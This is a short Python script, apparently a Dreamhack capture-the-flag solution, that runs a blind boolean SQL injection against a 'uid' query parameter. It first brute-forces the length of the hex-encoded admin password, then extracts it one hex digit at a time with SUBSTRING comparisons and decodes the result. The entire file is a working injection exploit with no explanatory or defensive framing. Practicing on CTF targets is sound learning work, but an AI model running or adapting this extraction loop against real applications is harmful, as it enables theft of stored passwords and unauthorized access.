import requests
from string import hexdigits

vulnerable_url="http://host3.dreamhack.games:23865"


def get_password_length():
    length=1
    while True:
        length+=1
        print(vulnerable_url+f"/?uid=admin'+and+LENGTH(upw)={length};--")
        resp = requests.get(vulnerable_url+f"/?uid=admin'+and+LENGTH(hex(upw))={length};--")
        exists='exists'
        print(f"current count of length {length}")
        if exists in resp.text: 
            return length


#final_length=get_password_length()
final_length=54
password=""

i=1

while i <= final_length:
    for character in hexdigits: 
        print(f" {password+character} , at position {i}")
        resp = requests.get(vulnerable_url+f"/?uid=admin'+and+SUBSTRING(HEX(upw)%2C{i}%2C1)%3D'{character}")
        if 'exists' in resp.text: 
            password+=character
            break;
    i+=1


print(bytes.fromhex(password).decode('utf-8'))
        

